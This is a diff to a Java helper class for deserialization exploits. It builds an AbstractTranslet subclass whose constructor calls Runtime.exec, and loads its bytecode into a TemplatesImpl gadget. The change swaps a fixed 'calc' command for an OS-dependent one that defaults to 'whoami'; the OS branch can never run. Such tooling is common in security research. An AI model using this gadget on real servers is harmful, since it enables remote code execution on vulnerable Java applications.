@@ -23,7 +23,18 @@ public class Utils {
         CtClass superClass = pool.get(AbstractTranslet.class.getName());
         ctClass.setSuperclass(superClass);
         CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
-        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
+        String plateform = System.getProperties().getProperty("os.name");
+        String command = "whoami";
+        if(command.isEmpty()){
+            if (plateform.contains("Windows")){
+                command = "calc.exe";
+            }else if (plateform.contains("Linux")){
+                command = "xcalc";
+            }else if (plateform.contains("Mac")){
+                command = "open -a Calculator";
+            }
+        }
+        constructor.setBody("Runtime.getRuntime().exec(\""+command+"\");");
         ctClass.addConstructor(constructor);
         return ctClass.toBytecode();
     }
@@ -40,6 +51,7 @@ public class Utils {
         SetValue(templates, "_bytecodes", bytes);
         SetValue(templates, "_name", "aaa");
         SetValue(templates, "_tfactory", new TransformerFactoryImpl());
+        System.out.println("test");
         return templates;
     }
     public static String Serialize(Object o) throws Exception{
